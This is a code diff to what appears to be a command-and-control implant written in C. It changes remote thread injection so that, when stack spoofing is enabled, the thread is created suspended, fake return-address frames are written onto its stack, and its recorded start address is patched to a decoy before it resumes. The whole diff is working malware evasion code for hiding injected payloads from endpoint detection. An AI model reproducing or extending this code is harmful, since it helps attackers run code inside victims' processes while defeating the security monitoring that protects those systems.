@@ -262,20 +262,62 @@ HANDLE ThreadCreate(
              *       Disable StackSpoof in profile for shellcode that reads its argument. */
             PVOID StartRoutine = Entry;
             PVOID StartArg     = Arg;
+            BOOL  UseSmr       = FALSE;
 
 #ifdef _WIN64
             if ( Instance->Config.Implant.StackSpoof && Instance->Win32.RtlUserThreadStart ) {
                 StartRoutine = Instance->Win32.RtlUserThreadStart;
                 StartArg     = Entry;
+                UseSmr       = TRUE; /* Tier 2: create suspended to write fake callstack frames */
             }
 #endif
 
-            /* execute the code by creating a new thread */
-            NtStatus = SysNtCreateThreadEx( &Thread, THREAD_ALL_ACCESS, NULL, Process, StartRoutine, StartArg, FALSE, 0, 0, 0, &ThreadAttr );
+            /* execute the code by creating a new thread; UseSmr=TRUE means CREATE_SUSPENDED for Tier 2 SMR */
+            NtStatus = SysNtCreateThreadEx( &Thread, THREAD_ALL_ACCESS, NULL, Process,
+                                             StartRoutine, StartArg,
+                                             UseSmr,
+                                             0, 0, 0, &ThreadAttr );
             if ( NT_SUCCESS( NtStatus ) ) {
                 if ( ThreadId ) {
                     *ThreadId = U_PTR( Client.UniqueThread );
                 }
+
+#ifdef _WIN64
+                if ( UseSmr ) {
+                    /* Tier 2 (HVC-047): write fake callstack frames and patch TEB.Win32StartAddress */
+                    if ( Instance->Config.Implant.InjSpoofStartAddr ) {
+                        CONTEXT      Ctx        = { 0 };
+                        PVOID        SpoofStart = Instance->Config.Implant.InjSpoofStartAddr;
+                        const INT32  ThrdWin32StartAddrClass = 9; /* ThreadQuerySetWin32StartAddress */
+
+                        /* read initial thread context to get RSP; use indirect syscall variant */
+                        Ctx.ContextFlags = CONTEXT_CONTROL;
+                        if ( NT_SUCCESS( SysNtGetContextThread( Thread, &Ctx ) ) && Ctx.Rsp ) {
+                            /* write 4 fake return addresses + NULL terminator at initial RSP;
+                             * entry argument is in RCX (register), not on stack -- safe to overwrite */
+                            PVOID Frames[5] = {
+                                Instance->Config.Implant.InjSpoofFrame[0],
+                                Instance->Config.Implant.InjSpoofFrame[1],
+                                Instance->Config.Implant.InjSpoofFrame[2],
+                                Instance->Config.Implant.InjSpoofFrame[3],
+                                NULL
+                            };
+                            SysNtWriteVirtualMemory( Process, (PVOID)Ctx.Rsp, Frames, sizeof(Frames), NULL );
+
+                            /* patch TEB.Win32StartAddress to the configured spoof target */
+                            Instance->Win32.NtSetInformationThread( Thread, ThrdWin32StartAddrClass,
+                                                                     &SpoofStart, sizeof(PVOID) );
+
+                            PRINTF( "Tier2 SMR: wrote frames at RSP %p, spoofed start to %p\n",
+                                    (PVOID)Ctx.Rsp, SpoofStart )
+                        } else {
+                            PUTS( "Tier2 SMR: NtGetContextThread failed - frames not written" )
+                        }
+                    }
+                    /* always resume -- if InjSpoofStartAddr is NULL, Tier 1 still ran */
+                    SysNtResumeThread( Thread, NULL );
+                }
+#endif
             } else {
                 PRINTF( "Failed to create new thread => NtStatus:[%x]\n", NtStatus );
                 NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
